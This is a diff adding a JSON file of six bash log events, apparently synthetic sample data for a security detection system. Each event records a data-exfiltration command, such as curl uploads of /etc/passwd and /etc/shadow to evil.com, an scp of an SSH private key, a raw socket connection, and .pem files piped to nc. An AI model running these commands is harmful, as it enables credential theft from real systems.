@@ -1,0 +1,62 @@
+[
+  {
+    "timestamp": "2026-06-27 20:42:48.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "tar czf /tmp/.hidden_archive.tgz /etc /home",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  },
+  {
+    "timestamp": "2026-06-27 20:43:33.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "curl -X POST https://evil.com/upload -F 'data=@/etc/passwd'",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  },
+  {
+    "timestamp": "2026-06-27 20:44:18.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "scp -P 2222 /home/admin/.ssh/id_rsa attacker@45.33.32.156:/tmp/",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  },
+  {
+    "timestamp": "2026-06-27 20:45:03.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "python3 -c 'import socket; s=socket.socket(); s.connect((\"45.33.32.156\",4444))'",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  },
+  {
+    "timestamp": "2026-06-27 20:45:48.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "base64 /etc/shadow | curl -d @- https://evil.com/collect",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  },
+  {
+    "timestamp": "2026-06-27 20:46:33.392097",
+    "log_source": "linux_bash",
+    "event_type": "data_exfiltration",
+    "ip": "45.33.32.156",
+    "user": "admin",
+    "command": "find / -name '*.pem' -exec cat {} \\; | nc 45.33.32.156 9999",
+    "details": "Suspicious outbound data transfer",
+    "host": "web-server-01"
+  }
+]
